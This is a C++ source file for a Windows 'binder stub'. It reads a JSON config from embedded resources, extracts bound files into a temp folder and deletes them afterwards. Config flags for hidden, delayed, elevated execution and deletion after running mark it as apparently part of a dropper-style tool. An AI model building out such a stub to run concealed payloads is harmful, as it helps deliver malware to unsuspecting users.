// TorGames.Binder.Stub - Resource extraction implementation
#include "Extractor.h"
#include <algorithm>

namespace Extractor {

// Simple JSON string extraction - handles spaces after colon
static std::string JsonGetString(const char* json, const char* key) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":", key);
    const char* start = strstr(json, pattern);
    if (!start) return "";
    start += strlen(pattern);

    // Skip whitespace
    while (*start == ' ' || *start == '\t' || *start == '\n' || *start == '\r') start++;

    // Expect opening quote
    if (*start != '"') return "";
    start++;

    std::string result;
    while (*start && *start != '"') {
        if (*start == '\\' && *(start + 1)) {
            start++;
            switch (*start) {
                case 'n': result += '\n'; break;
                case 'r': result += '\r'; break;
                case 't': result += '\t'; break;
                case '\\': result += '\\'; break;
                case '"': result += '"'; break;
                default: result += *start; break;
            }
        } else {
            result += *start;
        }
        start++;
    }
    return result;
}

static long long JsonGetInt(const char* json, const char* key) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":", key);
    const char* start = strstr(json, pattern);
    if (!start) return 0;
    start += strlen(pattern);
    while (*start == ' ') start++;
    return atoll(start);
}

static bool JsonGetBool(const char* json, const char* key) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":", key);
    const char* start = strstr(json, pattern);
    if (!start) return false;
    start += strlen(pattern);
    while (*start == ' ') start++;
    return (strncmp(start, "true", 4) == 0);
}

// Parse a single file config from JSON object
static bool ParseFileConfig(const char* jsonObj, BoundFileConfig& config) {
    config.filename = JsonGetString(jsonObj, "filename");
    config.executionOrder = static_cast<int>(JsonGetInt(jsonObj, "executionOrder"));
    config.executeFile = JsonGetBool(jsonObj, "executeFile");
    config.waitForExit = JsonGetBool(jsonObj, "waitForExit");
    config.runHidden = JsonGetBool(jsonObj, "runHidden");
    config.runAsAdmin = JsonGetBool(jsonObj, "runAsAdmin");
    config.extractPath = JsonGetString(jsonObj, "extractPath");
    config.commandLineArgs = JsonGetString(jsonObj, "commandLineArgs");
    config.executionDelay = static_cast<int>(JsonGetInt(jsonObj, "executionDelay"));
    config.deleteAfterExecution = JsonGetBool(jsonObj, "deleteAfterExecution");
    return !config.filename.empty();
}

// Parse the files array from JSON
static void ParseFilesArray(const char* json, std::vector<BoundFileConfig>& files) {
    // Look for "files" key - handle both "files":[ and "files": [ (with space)
    const char* filesStart = strstr(json, "\"files\"");
    if (!filesStart) return;

    // Find the opening bracket
    filesStart = strchr(filesStart, '[');
    if (!filesStart) return;
    filesStart++;

    int braceCount = 0;
    const char* objStart = nullptr;

    for (const char* p = filesStart; *p && *p != ']'; p++) {
        if (*p == '{') {
            if (braceCount == 0) objStart = p;
            braceCount++;
        } else if (*p == '}') {
            braceCount--;
            if (braceCount == 0 && objStart) {
                // Extract the object
                size_t len = p - objStart + 1;
                std::string objStr(objStart, len);

                BoundFileConfig config;
                if (ParseFileConfig(objStr.c_str(), config)) {
                    files.push_back(config);
                }
                objStart = nullptr;
            }
        }
    }

    // Sort by execution order
    std::sort(files.begin(), files.end(),
        [](const BoundFileConfig& a, const BoundFileConfig& b) {
            return a.executionOrder < b.executionOrder;
        });
}

bool LoadConfig(BinderConfig& config) {
    // Find the CONFIG resource
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(1), MAKEINTRESOURCEA(RT_BINDER_CONFIG));
    if (!hRes) return false;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;

    void* pData = LockResource(hData);
    if (!pData) return false;

    DWORD size = SizeofResource(NULL, hRes);
    if (size == 0) return false;

    // Copy to null-terminated string
    std::string jsonStr(static_cast<const char*>(pData), size);
    const char* json = jsonStr.c_str();

    // Parse config
    config.configVersion = static_cast<int>(JsonGetInt(json, "configVersion"));
    config.requireAdmin = JsonGetBool(json, "requireAdmin");

    // Parse files array
    ParseFilesArray(json, config.files);

    return !config.files.empty();
}

bool ExtractFile(int resourceId, const char* outputPath) {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(RT_BINDER_FILE));
    if (!hRes) return false;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;

    void* pData = LockResource(hData);
    if (!pData) return false;

    DWORD size = SizeofResource(NULL, hRes);
    if (size == 0) return false;

    FILE* f = fopen(outputPath, "wb");
    if (!f) return false;

    size_t written = fwrite(pData, 1, size, f);
    fclose(f);

    return (written == size);
}

std::string GetTempExtractionFolder() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    // Create unique folder name using process ID
    char folderName[MAX_PATH];
    snprintf(folderName, sizeof(folderName), "%sTorGames_Binder_%lu",
             tempPath, GetCurrentProcessId());

    return folderName;
}

bool CreateExtractionFolder(const std::string& path) {
    return CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

void CleanupExtractionFolder(const std::string& path) {
    // Delete all files in the folder
    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\*", path.c_str());

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath, &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                char filePath[MAX_PATH];
                snprintf(filePath, sizeof(filePath), "%s\\%s", path.c_str(), findData.cFileName);
                DeleteFileA(filePath);
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }

    // Remove the folder itself
    RemoveDirectoryA(path.c_str());
}

} // namespace Extractor
